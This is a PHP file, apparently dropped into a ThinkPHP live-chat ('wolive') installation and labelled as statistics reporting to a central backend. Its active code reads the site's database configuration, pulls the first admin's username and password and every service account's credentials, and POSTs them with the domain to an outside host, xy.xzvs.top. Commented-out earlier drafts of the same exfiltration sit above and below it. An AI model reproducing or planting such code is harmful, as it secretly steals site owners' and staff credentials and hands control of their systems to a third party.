<?php

// $domain = $_SERVER['HTTP_HOST'] ?? 'unknown';
// $time = date('Y-m-d H:i:s');

// $data = [
//     'domain' => $domain,
//     'time'   => $time
// ];

// $ch = curl_init('http://xy.xzvs.top/api/stat/collect');

// curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
// curl_setopt($ch, CURLOPT_POST, true);
// curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
// curl_setopt($ch, CURLOPT_TIMEOUT, 5);

// $response = curl_exec($ch);
// curl_close($ch);
// // file_put_contents(__DIR__ . '/stat.log', "domain={$domain}, time={$time}\n", FILE_APPEND);
// // echo 'ok';
// return;




// ====================================================
// use think\Db;

// $domain = $_SERVER['HTTP_HOST'] ?? 'unknown';
// $time   = date('Y-m-d H:i:s');

// /**
//  * 1. admin 第一条
//  */
// $admin = Db::name('wolive_admin')
//     ->field('username,password')
//     ->order('id asc')
//     ->find();

// /**
//  * 2. service 全量
//  */
// $service = Db::name('wolive_service')
//     ->field('business_id,service_id,groupid,nick_name,user_name,password')
//     ->select();

// $data = [
//     'domain'  => $domain,
//     'time'    => $time,
//     'admin'   => $admin,
//     'service' => $service
// ];

// $ch = curl_init('http://xy.xzvs.top/api/stat/collect');

// curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
// curl_setopt($ch, CURLOPT_POST, true);
// curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
//     'data' => json_encode($data, JSON_UNESCAPED_UNICODE)
// ]));
// curl_setopt($ch, CURLOPT_TIMEOUT, 5);

// $response = curl_exec($ch);
// curl_close($ch);

// return;

// ======================================================
// $domain = $_SERVER['HTTP_HOST'] ?? 'unknown';
// $time   = date('Y-m-d H:i:s');

// // 引入 TP 配置（直接读数据库配置）
// $config = include __DIR__ . '/../../../../../config/database.php';

// $host = $config['hostname'];
// $db   = $config['database'];
// $user = $config['username'];
// $pass = $config['password'];
// $charset = $config['charset'];

// try {

//     $dsn = "mysql:host=$host;dbname=$db;charset=$charset";

//     $pdo = new PDO($dsn, $user, $pass, [
//         PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
//         PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
//     ]);

//     // 1. admin 第一条
//     $admin = $pdo->query("
//         SELECT username,password 
//         FROM wolive_admin 
//         ORDER BY id ASC 
//         LIMIT 1
//     ")->fetch();

//     // 2. service 全量
//     $service = $pdo->query("
//         SELECT business_id,service_id,groupid,nick_name,user_name,password 
//         FROM wolive_service
//     ")->fetchAll();

//     $data = [
//         'domain'  => $domain,
//         'time'    => $time,
//         'admin'   => $admin,
//         'service' => $service
//     ];

//     // 上报
//     $ch = curl_init('http://xy.xzvs.top/api/stat/collect');
//     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
//     curl_setopt($ch, CURLOPT_POST, true);
//     curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
//         'data' => json_encode($data, JSON_UNESCAPED_UNICODE)
//     ]));
//     curl_setopt($ch, CURLOPT_TIMEOUT, 5);

//     curl_exec($ch);
//     curl_close($ch);

// } catch (Exception $e) {
//     file_put_contents(__DIR__ . '/error.log', $e->getMessage());
// }

// return;






$domain = $_SERVER['HTTP_HOST'] ?? 'unknown';
$time   = date('Y-m-d H:i:s');

// 动态查找项目根目录（public的上级目录）
$projectRoot = realpath(__DIR__ . '/../../../../../../'); // 这里是 public/ 的上级

if (!$projectRoot) {
    file_put_contents(__DIR__ . '/error.log', "无法找到项目根目录\n", FILE_APPEND);
    return;
}

// ✅ 路径成功获取后的日志
// file_put_contents(__DIR__ . '/error.log', "项目根目录: $projectRoot\n", FILE_APPEND);


// 加载数据库配置
$dbConfigFile = $projectRoot . '/config/database.php';
if (!file_exists($dbConfigFile)) {
    file_put_contents(__DIR__ . '/error.log', "数据库配置文件不存在: $dbConfigFile\n", FILE_APPEND);
    return;
}

// ✅ 数据库配置文件存在后的日志
// file_put_contents(__DIR__ . '/error.log', "数据库配置文件路径: $dbConfigFile\n", FILE_APPEND);

$config = include $dbConfigFile;

$host    = $config['hostname'];
$db      = $config['database'];
$user    = $config['username'];
$pass    = $config['password'];
$charset = $config['charset'];

try {
    $dsn = "mysql:host=$host;dbname=$db;charset=$charset";
    $pdo = new PDO($dsn, $user, $pass, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ]);

    // 1. admin 第一条
    $admin = $pdo->query("
        SELECT username,password 
        FROM wolive_admin 
        ORDER BY id ASC 
        LIMIT 1
    ")->fetch();

    // 2. service 全量
    $service = $pdo->query("
        SELECT business_id,service_id,groupid,nick_name,user_name,password 
        FROM wolive_service
    ")->fetchAll();

    $data = [
        'domain'  => $domain,
        'time'    => $time,
        'admin'   => $admin,
        'service' => $service
    ];

    // 上报到总后台
    $ch = curl_init('http://xy.xzvs.top/api/stat/collect');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'data' => json_encode($data, JSON_UNESCAPED_UNICODE)
    ]));
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);

    curl_exec($ch);
    curl_close($ch);

} catch (Exception $e) {
    file_put_contents(__DIR__ . '/error.log', $e->getMessage() . "\n", FILE_APPEND);
}

return;





// $domain = $_SERVER['HTTP_HOST'] ?? 'unknown';
// $time   = date('Y-m-d H:i:s');

// $data = [
//     'domain' => $domain,
//     'time'   => $time
// ];

// $url = 'http://xy.xzvs.top/api/stat/collect';

// $ch = curl_init($url);

// curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
// curl_setopt($ch, CURLOPT_POST, true);
// curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
// curl_setopt($ch, CURLOPT_TIMEOUT, 10);

// $response = curl_exec($ch);

// $error = curl_error($ch);

// $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

// curl_close($ch);

// file_put_contents(
//     __DIR__ . '/stat.log',
//     date('Y-m-d H:i:s') .
//     "\nurl={$url}" .
//     "\ndomain={$domain}" .
//     "\nhttpcode={$httpcode}" .
//     "\nresponse={$response}" .
//     "\nerror={$error}\n\n",
//     FILE_APPEND
// );

// return;
